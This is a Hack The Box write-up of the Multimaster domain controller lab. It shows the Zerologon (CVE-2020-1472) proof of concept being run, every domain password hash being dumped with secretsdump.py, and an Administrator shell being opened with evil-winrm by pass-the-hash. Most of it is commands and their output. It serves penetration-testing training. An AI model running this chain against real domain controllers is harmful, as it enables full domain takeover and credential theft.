# Exercise: Case Study Multimaster

This machine illustrates that even on Hack The Box, there are sometimes security misconfigurations and unintended vulnerable components. The machine is a domain controller in which the initial vulnerability is through a SQL injection. However, it turned out that the machine was released a few weeks before CVE-2020-1472 was disclosed and so it was actually vulnerable to the Zerologon attack. To test this, you can use the proof of concept of this attack:

```bash
┌─[rin@parrot]─[~/boxes/Multimaster]
└──╼ $git clone https://github.com/dirkjanm/CVE-2020-1472
To execute, you simply give the name of the domain and the IP address of the domain controller:
┌─[rin@parrot]─[~/boxes/Multimaster/CVE-2020-1472]
└──╼ $python3 cve-2020-1472-exploit.py MULTIMASTER 10.10.10.179
Performing authentication attempts...
============================================================================================================================
Target vulnerable, changing account password to empty string
Result: 0
Exploit complete!
```

Now that the machine password has been set to an empty string, you can use Impacket's secretsdump.py that will collect all of the domain's users and password hashes:

```bash
┌─[✗]─[rin@parrot]─[~/boxes/Multimaster/CVE-2020-1472]
└──╼ $secretsdump.py -just-dc -no-pass MULTIMASTER\$@10.10.10.179
Impacket v0.9.22.dev1+20200915.115225.78e8c8e4 - Copyright 2020 SecureAuth Corporation
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:69cbf4a9b7415c9e1caf93d51d971be0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:06e3ae564999dbad74e576cdf0f717d3:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
MEGACORP.LOCAL\svc-nas:1103:aad3b435b51404eeaad3b435b51404ee:fe90dcf97ce6511a65151881708d6027:::
MEGACORP.LOCAL\tushikikatomo:1110:aad3b435b51404eeaad3b435b51404ee:1c9c8bfd28d000e8904f23c280b25d21:::
MEGACORP.LOCAL\andrew:1111:aad3b435b51404eeaad3b435b51404ee:9e63ebcb217bf3c6b27056fdcb6150f7:::
MEGACORP.LOCAL\lana:1112:aad3b435b51404eeaad3b435b51404ee:3c3c292710286a539bbec397d15b4680:::
MEGACORP.LOCAL\alice:1601:aad3b435b51404eeaad3b435b51404ee:19b44ab9ec562fe20b35ddb7c6fc0689:::
<SNIP>
```

Once you have these hashes, you can use Administrator's account to remote access the machine using evil-winrm

```bash
┌─[✗]─[rin@parrot]─[/opt/evil-winrm]
└──╼ $evil-winrm -u Administrator -H 69cbf4a9b7415c9e1caf93d51d971be0 -i 10.10.10.179
Evil-WinRM shell v2.3
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
megacorp\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

Of course, this attack will have impacted the domain controller significantly by resetting the machine account's password to an empty string. If this was a machine with other Hack The Box users accessing it, you would want to avoid doing something that would significantly impact their experience. As a real attacker, this would send alerts flying and so that would be a consideration as well. Nevertheless, this is an exploit that is being used in the wild as I am writing this.

1. 
